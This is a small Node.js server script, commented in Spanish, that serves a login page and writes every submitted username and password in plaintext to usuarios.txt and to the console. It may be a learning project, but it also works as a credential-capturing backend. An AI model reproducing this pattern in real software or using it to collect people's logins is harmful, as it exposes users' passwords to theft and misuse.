/* =========================================================
   SERVIDOR SENCILLO (sin instalar nada, solo Node)
   - Muestra la página (index.html, login.html, css, js, img)
   - Guarda usuario y contraseña en usuarios.txt al acceder
   Para correrlo:  node server.js   ->  http://localhost:5500
   ========================================================= */
const http = require('http');
const fs = require('fs');
const path = require('path');

const PUERTO = 5500;
const RAIZ = __dirname;

// tipos de archivo que sabe servir
const TIPOS = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon'
};

const servidor = http.createServer((req, res) => {

  // ---- GUARDAR usuario y contraseña ----
  if (req.method === 'POST' && req.url === '/guardar') {
    let cuerpo = '';
    req.on('data', trozo => cuerpo += trozo);
    req.on('end', () => {
      try {
        const { usuario, clave } = JSON.parse(cuerpo);
        const fecha = new Date().toLocaleString('es-BO');
        const linea = `Usuario: ${usuario} | Contrasena: ${clave} | Fecha: ${fecha}\n`;
        fs.appendFileSync(path.join(RAIZ, 'usuarios.txt'), linea, 'utf8');
        console.log('Guardado ->', linea.trim());
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, error: e.message }));
      }
    });
    return;
  }

  // ---- SERVIR ARCHIVOS ----
  let ruta = req.url === '/' ? '/index.html' : decodeURIComponent(req.url.split('?')[0]);
  let archivo = path.join(RAIZ, ruta);

  // seguridad: no salir de la carpeta
  if (!archivo.startsWith(RAIZ)) { res.writeHead(403); res.end('Prohibido'); return; }

  fs.readFile(archivo, (err, datos) => {
    if (err) { res.writeHead(404, {'Content-Type':'text/html; charset=utf-8'}); res.end('<h1>404 - No encontrado</h1>'); return; }
    const ext = path.extname(archivo).toLowerCase();
    res.writeHead(200, { 'Content-Type': TIPOS[ext] || 'application/octet-stream', 'Cache-Control': 'no-store' });
    res.end(datos);
  });
});

servidor.listen(PUERTO, () => {
  console.log('Servidor corriendo en  http://localhost:' + PUERTO);
  console.log('Los accesos se guardan en  usuarios.txt');
});
